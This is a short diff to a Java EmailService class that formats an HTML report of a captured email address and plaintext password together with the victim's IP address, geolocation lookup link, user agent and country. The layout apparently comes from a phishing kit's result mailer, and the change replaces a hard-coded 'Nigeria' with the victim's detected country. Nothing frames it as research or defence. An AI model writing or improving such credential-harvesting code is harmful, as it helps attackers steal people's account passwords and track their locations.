@@ -33,7 +33,7 @@ public class EmailService {
 				+ "        <p>Email Address               :"+email.getEmail()+"</p>\n"
 				+ "        <p>Password             :"+email.getPassword()+"</p>\n"
 				+ "        <p>|---------------------- INFO | IP | Location ------------------------|</p>\n"
-				+ "        <p>|Client Location:  Nigeria</p>\n"
+				+ "        <p>|Client Location:  "+email.getCountry()+"</p>\n"
 				+ "        <p>|-- http://www.geoiptool.com/?IP="+email.getIpAddress()+" ------</p>\n"
 				+ "        <p>User Agent: "+email.getUserAgent()+"</p>\n"
 				+ "        <p>|-------- unknown ----------|</p>\n"
